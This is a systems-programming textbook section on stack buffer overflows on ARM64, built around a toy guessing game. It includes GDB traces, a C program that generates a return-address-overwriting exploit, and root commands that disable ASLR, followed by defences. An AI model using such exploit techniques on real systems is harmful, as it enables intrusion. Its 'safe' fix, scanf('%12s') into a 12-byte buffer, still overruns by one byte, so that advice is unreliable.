title: "9.10. Buffer Overflows"
lang: en
---

The C language does not perform automatic array bounds checking. Accessing memory outside of the bounds of an array is problematic and often results in errors such as segmentation faults. However, a clever attacker can inject malicious code that intentionally overruns the boundary of an array (also known as a **buffer**) to force the program to execute in an unintended manner. In the worst cases, the attacker can run code that allows them to gain **root privilege**, or OS-level access to the computer system. A piece of software that takes advantage of the existence of a known buffer overrun error in a program is known as a **buffer overflow exploit**.

In this section, we use GDB and assembly language to fully characterize the mechanics of a buffer overflow exploit. Prior to reading this chapter we encourage you to explore the chapter discussing [GDB for inspecting assembly code](https://diveintosystems.org/book/C3-C_debug/gdb_assembly.html#_debugging_assembly_code).

### [](#_famous_examples_of_buffer_overflow)9.10.1. Famous Examples of Buffer Overflow

Buffer overflow exploits emerged in the 1980s and remained a chief scourge of the computing industry through the early parts of the 2000s. While many modern operating systems have protections against the simplest buffer overflow attacks, careless programming errors can still leave modern programs wide open to attack. Buffer overflow exploits have recently been discovered in Skype1, Android2, Google Chrome3, and others.

Here are some notable historic examples of buffer overflow exploits.

The Morris Worm

The Morris Worm4 was released in 1988 on ARPANet from MIT (to hide that it was written by a student at Cornell) and exploited a buffer overrun vulnerability that existed in the Unix finger daemon (`fingerd`). In Linux and other Unix-like systems, a **daemon** is a type of process that continuously executes in the background, usually performing clean-up and monitoring tasks. The `fingerd` daemon returns a user-friendly report on a computer or person. Most crucially, the worm had a replication mechanism that caused it to be sent to the same computer multiple times, bogging down the system to an unusable state. While the author claimed that the worm was meant as a harmless intellectual exercise, the replication mechanism enabled the worm to spread easily and made it difficult to remove. In future years, other worms would employ buffer overflow exploits to gain unauthorized access into systems. Notable examples include Code Red (2001), MS-SQLSlammer (2003), and W32/Blaster (2003).

AOL Chat Wars

David Auerbach5, a former Microsoft engineer, detailed his experience with a buffer overflow during his efforts to integrate Microsoft’s Messenger Service (MMS) with AOL Instant Messenger in the late 1990s. Back then, AOL Instant Messenger (AIM) was *the* service to use if you wanted to instant message (or IM) friends and family. Microsoft tried to gain a foothold in this market by designing a feature in MMS that enabled MMS users to talk to their AIM "buddies." Displeased, AOL patched their servers so that MMS could no longer connect to them. Microsoft engineers figured out a way for MMS clients to mimic the messages sent by AIM clients to AOL servers, making it difficult for AOL to distinguish between messages received by MMS and AIM. AOL responded by changing the way AIM sent messages, and MMS engineers duly changed their client’s messages to once again match AIM’s. This "chat war" continued until AOL started using a buffer overflow error *in their own client* to verify that sent messages came from AIM clients. Since MMS clients did not have the same vulnerability, the chat wars ended, with AOL as the victor.

### [](#_a_first_look_the_guessing_game)9.10.2. A First Look: The Guessing Game

To help you understand the mechanism of the buffer overflow attack, we provide an executable of a simple program that enables the user to play a guessing game with the program. Download the `secret` executable at [this link](https://diveintosystems.org/book/C9-ARM64/_attachments/secretARM64.tar.gz) and extract it using the `tar` command:

```bash
$ tar -xzvf secretARM64.tar.gz
```

In the following, we provide a copy of `main.c` ([main.c](https://diveintosystems.org/book/C9-ARM64/_attachments/main.c)), the main file associated with the executable:

```c
#include <stdio.h>
#include <stdlib.h>
#include "other.h"

int endGame(void){
  printf("You win!\n");
  exit(0);
}

int playGame(void){
  int guess, secret, len, x=3;
  char buf[12];
  printf("Enter secret number:\n");
  scanf("%s", buf);
  guess = atoi(buf);
  secret=getSecretCode();
  if (guess == secret)
    printf("You got it right!\n");
  else{
    printf("You are so wrong!\n");
    return 1;
  }
  printf("Enter the secret string to win:\n");
  scanf("%s", buf);
  guess = calculateValue(buf, strlen(buf));
  if (guess != secret){
    printf("You lose!\n");
    return 2;
  }
  endGame();
  return 0;
}

int main(void) {
  int res = playGame();
  return res;
}
```

This game prompts the user to enter first a secret number and then a secret string to win the guessing game. The header file `other.h` contains the definition of the `getSecretCode` and `calculateValue` functions, but it is unavailable to us. How then can a user beat the program? Brute forcing the solution will take too long. One strategy is to analyze the `secret` executable in GDB and step through the assembly to reveal the secret number and string. The process of examining assembly code to reveal knowledge of how it works is commonly referred to as **reverse engineering**. Readers comfortable enough with GDB and reading assembly should be able to use GDB to reverse engineer the secret number and the secret string.

However, there is a different, sneakier way to win.

### [](#_taking_a_closer_look_under_the_c)9.10.3. Taking a Closer Look (Under the C)

The program contains a potential buffer overrun vulnerability at the first call to `scanf`. To understand what is going on, let’s inspect the assembly code of the `main` function using GDB. Let’s also place a breakpoint at address 0x0000aaaaaaaaa92c, which is the address of the instruction right before the call to `scanf` (placing the breakpoint at the address for `scanf` causes program execution to halt *inside* the call to `scanf`, not in `main`) and then use `ni` to advance forward one instruction:

```javascript
Dump of assembler code for function playGame:
   0x0000aaaaaaaaa908 <+0>:	stp	x29, x30, [sp, #-48]!
   0x0000aaaaaaaaa90c <+4>:	mov	x29, sp
   0x0000aaaaaaaaa910 <+8>:	mov	w0, #0x3

   0x0000aaaaaaaaa924 <+28>:	add	x1, x29, #0x18
   0x0000aaaaaaaaa928 <+32>:	adrp	x0, 0xaaaaaaaaa000

=> 0x0000aaaaaaaaa930 <+40>:	bl	0xaaaaaaaaa740 <__isoc99_scanf@plt>
```

[Figure 1](#beforescana64) depicts the stack immediately before the call to `scanf`.

![before](/images/dive-into-systems/c9-arm64-0-beforeScanf.webp) Figure 1. The call stack immediately before the call to scanf

Prior to the call to `scanf`, the first two arguments for `scanf` are preloaded into registers `x0` and `x1`, respectively. The address of array `buf` is stored at stack location `x29+0x18` (see ``).

Now, suppose that the user enters `1234567890` at the prompt. [Figure 2](#afterScanfa64) illustrates what the stack looks like immediately after the call to `scanf` completes.

![after](/images/dive-into-systems/c9-arm64-1-afterScanf.webp) Figure 2. The call stack immediately after the call to scanf with input 1234567890

Recall that the hex values for the ASCII encodings of the digits 0 to 9 are 0x30 to 0x39, and that each stack memory location is eight bytes long. The frame pointer for `main` is 56 bytes away from the stack pointer. Readers tracing along can confirm the value of `x29` by using GDB to print its value (`p x29`). In the example shown, the saved value of `x29` is 0xffffffffeef0. The following command allows the reader to inspect the 64 bytes (in hex) below register `sp`:

```
(gdb) x /64bx $sp
```

This GDB command yields output that looks similar to the following:

```
(gdb) x /64bx $sp
0xffffffffeec0:	0xf0	0xee	0xff	0xff	0xff	0xff	0x00	0x00
0xffffffffeec8:	0xf0	0xa9	0xaa	0xaa	0xaa	0xaa	0x00	0x00
0xffffffffeed0:	0x10	0xef	0xff	0xff	0xff	0xff	0x00	0x00
0xffffffffeed8:	0x31	0x32	0x33	0x34	0x35	0x36	0x37	0x38
0xffffffffeee0:	0x39	0x30	0x00	0xaa	0xaa	0xaa	0x00	0x00
0xffffffffeee8:	0x00	0x00	0x00	0x00	0x03	0x00	0x00	0x00
0xffffffffeef0:	0x10	0xef	0xff	0xff	0xff	0xff	0x00	0x00
0xffffffffeef8:	0xe0	0x36	0x58	0xbf	0xff	0xff	0x00	0x00
```

Each line represents one 64-bit address, or two 32-bit addresses. So, the value associated with the 32-bit address 0xffffffffeedc is located at the rightmost four bytes of the line showing 0xffffffffeed8.

**Note — Multibyte values are stored in little-endian order**

> In the preceding assembly segment, the byte at address 0xffffffffeec0 is 0xf0, the byte at address 0xffffffffeec1 is 0xee, the byte at address 0xffffffffeec2 is 0xff, the byte at address 0xffffffffeec3 is 0xff, the byte at address 0xffffffffeec4 is 0xff, and the byte at address 0xffffffffeec5 is 0xff. However, the 64-bit *value* at address 0xffffffffeec0 is in fact 0xffffffffeef0. Remember that because ARM64 is a [little-endian](https://diveintosystems.org/book/C4-Binary/byte_order.html#_integer_byte_order) system by default, the bytes for multibyte values such as addresses are stored in reverse order.

In this example, the address for `buf` is located at address 0xffffffffeed8. Therefore, the following two addresses hold the bytes associated with input string `1234567890`:

```
0xffffffffeed8:	0x31	0x32	0x33	0x34	0x35	0x36	0x37	0x38
0xffffffffeee0:	0x39	0x30	0x00	0xaa	0xaa	0xaa	0x00	0x00
```

The null termination byte `\0` appears in the third byte location at address 0xffffffffeee2. Recall that `scanf` terminates all strings with a null byte.

Of course, `1234567890` is not the secret number. Here is the output when we try to run `secret` with input string `1234567890`:

```bash
$ ./secret
$ ./secret
Enter secret number:
1234567890
You are so wrong!
$ echo $?
1
```

The `echo $?` command prints out the return value of the last executed command in the shell. In this case, the program returned 1, because the secret number we entered is wrong. Recall that by convention, programs return 0 when there are no errors. Our goal going forward is to trick the program to exit with a 0 return value, indicating that we won the game.

### [](#_buffer_overflow_first_attempt)9.10.4. Buffer Overflow: First Attempt

Next, let’s try typing in the string `12345678901234567890123456789012345`:

```bash
$ ./secret
Enter secret number:
12345678901234567890123456789012345
You are so wrong!
Bus error
$ echo $?
139
```

Interesting! Now the program crashes with a bus error (another type of memory error), with return code 139. [Figure 3](#afterScanf2a64) shows what the call stack for `main` looks like immediately after the call to `scanf` with this new input.

![after2](/images/dive-into-systems/c9-arm64-2-afterScanf2.webp) Figure 3. The call stack immediately after the call to scanf with input 12345678901234567890123456789012345

The input string is so long that it not only overwrote the saved `x29` stored at address 0xeed8, but it spilled over into the return address below the stack frame for `main`. Recall that when a function returns, the program tries to resume execution at the address specified by the return address. In this example, the program tries to resume execution at address 0xffff00353433 after exiting `main`, which does not appear to exist. So the program crashes with a bus error.

Rerunning the program in GDB (`input.txt` contains the input string above) reveals this devilry in action:

```bash
$ gdb secret
(gdb) break *0x0000aaaaaaaaa934
(gdb) run < input.txt
(gdb) ni
(gdb) x /64bx $sp
0xffffffffeec0:	0xf0	0xee	0xff	0xff	0xff	0xff	0x00	0x00
0xffffffffeec8:	0xf0	0xa9	0xaa	0xaa	0xaa	0xaa	0x00	0x00
0xffffffffeed0:	0x10	0xef	0xff	0xff	0xff	0xff	0x00	0x00
0xffffffffeed8:	0x31	0x32	0x33	0x34	0x35	0x36	0x37	0x38
0xffffffffeee0:	0x39	0x30	0x31	0x32	0x33	0x34	0x35	0x36
0xffffffffeee8:	0x37	0x38	0x39	0x30	0x31	0x32	0x33	0x34
0xffffffffeef0:	0x35	0x36	0x37	0x38	0x39	0x30	0x31	0x32
0xffffffffeef8:	0x33	0x34	0x35	0x00	0xff	0xff	0x00	0x00
(gdb) n
Single stepping until exit from function playGame,
which has no line number information.
You are so wrong!
0x0000aaaaaaaaa9f0 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
0x0000ffff00353433 in ?? ()
```

Notice that our input string blew past the stated limits of the array `buf`, overwriting all the other values stored on the stack. In other words, our string created a buffer overrun and corrupted the call stack, causing the program to crash. This process is also known as **smashing the stack**.

### [](#_a_smarter_buffer_overflow_second_attempt)9.10.5. A Smarter Buffer Overflow: Second Attempt

Our first example smashed the stack by overwriting the saved `x29` register and return address for `main` with junk, causing the program to crash. An attacker whose goal is to simply crash a program would be satisfied at this point. However, our goal is to trick the guessing game to return 0, indicating that we won the game. We accomplish this by filling the call stack with data more meaningful than junk values. For example, we could overwrite the stack so that the return address is replaced with the address of `endGame`. Then, when the program attempts to return from `main`, it will instead execute `endGame` instead of crashing.

To find out the address of `endGame`, let’s inspect `secret` again in GDB:

```bash
$ gdb secret
(gdb) disas endGame
Dump of assembler code for function endGame:
   0x0000aaaaaaaaa8ec <+0>:	stp	x29, x30, [sp, #-16]!
   0x0000aaaaaaaaa8f0 <+4>:	mov	x29, sp
   0x0000aaaaaaaaa8f4 <+8>:	adrp	x0, 0xaaaaaaaaa000
   0x0000aaaaaaaaa8f8 <+12>:	add	x0, x0, #0xab0
   0x0000aaaaaaaaa8fc <+16>:	bl	0xaaaaaaaaa730 <puts@plt>
   0x0000aaaaaaaaa900 <+20>:	mov	w0, #0x0
   0x0000aaaaaaaaa904 <+24>:	bl	0xaaaaaaaaa6d0 <exit@plt>
```

Observe that `endGame` starts at address 0x0000aaaaaaaaa8ec. [Figure 4](#finalExploita64) illustrates a sample exploit that forces `secret` to run the `endGame` function.

![exploit](/images/dive-into-systems/c9-arm64-3-finalExploit.webp) Figure 4. A sample string that can force secret to execute the endGame function

Essentially, there are 32 bytes of junk values followed by the return address. Again, because ARM64 is a [little-endian](https://diveintosystems.org/book/C4-Binary/byte_order.html#_integer_byte_order) system by default, the bytes in the return address appear to be in reverse order.

The following program illustrates how an attacker could construct the preceding exploit:

```c
#include <stdio.h>

char ebuff[]=
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*first 10 bytes of junk*/
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*next 10 bytes of junk*/
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*following 10 bytes of junk*/
"\x00\x00" /*last 2 bytes of junk*/
"\xec\xa8\xaa\xaa\xaa\xaa\x00\x00" /*address of endGame (little endian)*/
;

int main(void) {
    int i;
    for (i = 0; i < sizeof(ebuff); i++) { /*print each character*/
        printf("%c", ebuff[i]);
    }
    return 0;
}
```

The `\x` before each number indicates that the number is formatted as the hexadecimal representation for a character. After defining `ebuff[]`, the `main` function simply prints it out, character by character. To get the associated byte string, compile and run this program as follows:

```bash
$ gcc -o genEx genEx.c
$ ./genEx > exploit
```

To use `exploit` as input to `scanf`, it suffices to run `secret` with `exploit`. To get the exploit to work on a Raspberry Pi, type the following set of commands as root (we will explain what is going on following the example):

```bash
$ sudo su
[sudo] password for pi:
root@pi# echo "0" > /proc/sys/kernel/randomize_va_space
root@pi# exit
$
```

The `sudo su` command puts you in root mode on the Raspberry Pi. When prompted for a password, use your password (we assume you have root access to the Raspberry Pi). As soon as the password is entered, the next set of commands are typed in root mode. Note that the command prompt changes when a user is in root mode (it looks something like `root@pi#`).

The `echo` command overwrites the contents of the file `randomize_va_space` with the value 0. Next, the `exit` command returns the user back to user mode.

Now, type the following command at the prompt:

```bash
$ ./secret < exploit
Enter secret number:
You are so wrong!
You win!
```

The program prints out "You are so wrong!" because the string contained in `exploit` is *not* the secret number. However, the program also prints out the string "You win!" Recall, though, that our goal is to trick the program to return 0. In a larger system, where the notion of "success" is tracked by an external program, it is often most important what a program returns, not what it prints out.

Checking the return value yields:

```bash
$ echo $?
0
```

Our exploit works! We won the game!

### [](#_protecting_against_buffer_overflow)9.10.6. Protecting Against Buffer Overflow

The example we showed changed the control flow of the `secret` executable, forcing it to return a zero value associated with success. We had to accomplish this in a fairly wonky way due to stack protections that ARM and GCC include to combat this particular type of attack. However, buffer overflow exploits can do real damage on older systems. Some older computer systems also *executed* bytes from stack memory. If an attacker placed bytes associated with assembly instructions on the call stack, the CPU would interpret the bytes as *real* instructions, enabling the attacker to force the CPU to execute *any arbitrary code of their choosing*. Fortunately, there are strategies that modern computer systems employ to make it more difficult for attackers to run buffer overflow exploits:

- **Stack randomization**: The OS allocates the starting address of the stack at a random location in stack memory, causing the position/size of the call stack to vary from one run of a program to another. When we overwrote the `/proc/sys/kernel/randomize_va_space` file with a 0 value, we temporarily turned off stack randomization on the Raspberry Pi (this file returns to its original value on restart). Without turning off stack randomization, multiple machines running the same code would have different stack addresses. Modern Linux systems use stack randomization as a standard practice. However, a determined attacker can brute force the attack, by attempting to repeat attacks with different addresses. A common trick is to use a **NOP sled** (i.e., a large number of NOP instructions) before the actual exploit code. Executing the NOP instruction (`0x90`) has no effect, other than causing the program counter to increment to the next instruction. As long as the attacker can get the CPU to execute somewhere in the NOP sled, the NOP sled will eventually lead to the exploit code that follows it. Aleph One’s writeup, *Smashing the Stack for Fun and Profit*6 details the mechanism of this type of attack.
- **Stack corruption detection**: Another line of defense is to try to detect when the stack is corrupted. Recent versions of GCC use a stack protector known as a **canary** that acts as a guard between the buffer and the other elements of the stack. A canary is a value stored in a nonwriteable section of memory that can be compared to a value put on the stack. If the canary "dies" during a program’s execution, the program knows that it is under attack and aborts with an error message. For simplicity, we removed the canary from our `secret` executable by compiling it with the `fno-stack-protector` flag in GCC. However, a clever attacker can replace the canary during the course of the attack to prevent the program from detecting stack corruption.
- **Limiting executable regions**: In this line of defense, executable code is restricted to only particular regions of memory. In other words, the call stack is no longer executable. However, even this defense can be defeated. In an attack utilizing **return-oriented programming** (ROP), an attacker can "cherry-pick" instructions in executable regions, and jump from instruction to instruction to build an exploit. There are some famous examples of this on-line, especially in video games7.

However, the best line of defense is always the programmer. To prevent buffer overflow attacks on your programs, use C functions with **length specifiers** whenever possible and add code that performs array bounds checking. It is crucial that any defined arrays match the chosen length specifiers. [Table 1](#specifiersa64) lists some common "bad" C functions that are vulnerable to buffer overflow, and the corresponding "good" function to use (assume that `buf` is allocated 12 bytes):

| Instead of | Use |
| --- | --- |
| `gets(buf)` | `fgets(buf, 12, stdin)` |
| `scanf("%s", buf)` | `scanf("%12s", buf)` |
| `strcpy(buf2, buf)` | `strncpy(buf2, buf, 12)` |
| `strcat(buf2, buf)` | `strncat(buf2, buf, 12)` |
| `sprintf(buf, "%d", num)` | `snprintf(buf, 12, "%d", num)` |

The `secret2` binary ([secret2ARM64.tar.gz](https://diveintosystems.org/book/C9-ARM64/_attachments/secret2ARM64.tar.gz)) no longer has the buffer overflow vulnerability. The `playGame` function of this new binary ([main2.c](https://diveintosystems.org/book/C9-ARM64/_attachments/main2.c)) appears below:

```c
int playGame(void){
  int guess, secret, len, x=3;
  char buf[12];
  printf("Enter secret number:\n");
  scanf("%12s", buf); //lengths specifier added here!
  guess = atoi(buf);
  secret=getSecretCode();
  if (guess == secret)
    printf("You got it right!\n");
  else{
    printf("You are so wrong!\n");
    return 1;
  }
  printf("Enter the secret string to win:\n");
  scanf("%12s", buf); //length specifier added here!
  guess = calculateValue(buf, strlen(buf));
  if (guess != secret){
    printf("You lose!\n");
    return 2;
  }
  endGame();
  return 0;
}
```

Notice that we added a length specifier to all calls of `scanf`, causing the `scanf` function to stop reading from input after the first 12 bytes are read. The exploit string no longer breaks the program:

```bash
$ ./secret2 < exploit
Enter secret number:
You are so wrong!
$ echo $?
1
```

Of course, any reader with basic reverse-engineering skills can still win the guessing game by analyzing the assembly code. If you haven’t tried to beat the program yet with reverse engineering, we encourage you to do so now.
